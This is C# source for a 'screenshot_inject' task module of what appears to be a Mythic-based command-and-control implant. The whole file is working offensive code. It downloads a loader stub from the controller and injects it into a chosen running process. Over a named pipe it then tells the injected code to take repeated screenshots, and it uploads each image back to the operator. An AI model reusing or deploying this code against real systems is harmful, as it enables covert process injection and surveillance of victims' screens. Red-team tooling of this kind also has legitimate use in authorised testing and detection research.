#define COMMAND_NAME_UPPER

#if DEBUG
#define SCREENSHOT_INJECT
#endif

#if SCREENSHOT_INJECT

using PhantomInterop.Classes;
using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Interfaces;
using PhantomInterop.Serializers;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class screenshot_inject : Tasking
    {
        [DataContract]
        internal struct ScreenshotInjectParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "count")]
            public int Count;
            [DataMember(Name = "interval")]
            public int Interval;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pid")]
            public int PID;
        }
        private ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
        private AutoResetEvent _pipeConnected = new AutoResetEvent(false);

        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<ICommandMessage> _msgRecvQueue = new ConcurrentQueue<ICommandMessage>();
        private JsonHandler _serializer = new JsonHandler();
        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        private Action<object> _transmitAction;
        private Action<object> _putFilesAction;
        List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();

        private bool _isFinished = false;

        public screenshot_inject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
            _transmitAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _msgSendEvent,
                    _stopToken.Token.WaitHandle,
                    _taskComplete
                    });
                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
                    }
                }
                _isFinished = true;
                _taskComplete.Set();
            };
            _putFilesAction = (object p) =>
            {
                WaitHandle[] waiters = new WaitHandle[] { _putFilesEvent, _stopToken.Token.WaitHandle, _taskComplete };
                while (!_stopToken.IsCancellationRequested && !_isFinished)
                {
                    WaitHandle.WaitAny(waiters);
                    if (_putFilesQueue.TryDequeue(out byte[] screen))
                    {
                        ST.Task<bool> uploadTask = new ST.Task<bool>(() =>
                        {
                            if (_agent.GetFileManager().PutFile(
                                _stopToken.Token,
                                _data.ID,
                                screen,
                                null,
                                out string mythicFileId,
                                true))
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    mythicFileId,
                                    false,
                                    ""));
                                return true;
                            } else
                            {
                                return false;
                            }
                        }, _stopToken.Token);
                        uploadTasks.Add(uploadTask);
                        uploadTask.Start();
                    }
                }
            };
        }



        public override void Start()
        {
            MythicTaskResponse resp;
            try
            {
                ScreenshotInjectParameters parameters = _dataSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    bool pidRunning = false;
                    try
                    {
                        System.Diagnostics.Process.GetProcessById(parameters.PID);
                        pidRunning = true;
                    }
                    catch
                    {
                        pidRunning = false;
                    }

                    if (pidRunning)
                    {
                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] exeAsmPic))
                        {
                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
                            if (injector.Inject())
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    "",
                                    false,
                                    "",
                                    new ICommandMessage[]
                                    {
                                        Artifact.ProcessInject(parameters.PID,
                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                    }));
                                int count = 1;
                                int interval = 0;
                                if (parameters.Count > 0)
                                {
                                    count = parameters.Count;
                                }

                                if (parameters.Interval >= 0)
                                {
                                    interval = parameters.Interval;
                                }

                                IPCCommandArguments cmdargs = new IPCCommandArguments
                                {
                                    ByteData = new byte[0],
                                    StringData = string.Format("{0} {1}", count, interval)
                                };
                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                client.ConnectionEstablished += OnConnectionReady;
                                client.MessageReceived += ProcessReceivedMessage;
                                client.Disconnect += OnConnectionClosed;
                                if (client.Connect(10000))
                                {
                                    DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                                    foreach (DataChunk chunk in chunks)
                                    {
                                        _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                    }

                                    _msgSendEvent.Set();
                                    WaitHandle[] waiters = new WaitHandle[]
                                    {
                                        _taskComplete,
                                        _stopToken.Token.WaitHandle
                                    };
                                    WaitHandle.WaitAny(waiters);
                                    ST.Task.WaitAll(uploadTasks.ToArray());
                                    //bool bRet = uploadTasks.Where(t => t.Result == false).ToArray().Length == 0;
                                    bool bRet = uploadTasks.All(t => t.Result is true);
                                    if (bRet)
                                    {
                                        resp = CreateTaskResponse("", true, "completed");
                                    }
                                    else
                                    {
                                        resp = CreateTaskResponse("", true, "error");
                                    }
                                }
                                else
                                {
                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse(
                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                true,
                                "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Process with ID {parameters.PID} is not running.",
                            true,
                            "error");
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void OnConnectionClosed(object sender, PipeMessageData e)
        {
            e.Pipe.Close();
            _msgSendEvent.Set();
        }

        private void OnConnectionReady(object sender, PipeMessageData e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_putFilesAction, null, _stopToken.Token);
        }

        private void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
                {
                    pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
                }
            }
        }

        private void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());

            if (msg.GetTypeCode() != MessageType.ScreenshotInformation)
            {
                throw new Exception("Invalid type received from the named pipe!");
            }
            _putFilesQueue.Enqueue(((ScreenshotInformation)msg).Data);
            _putFilesEvent.Set();
        }
    }
}
#endif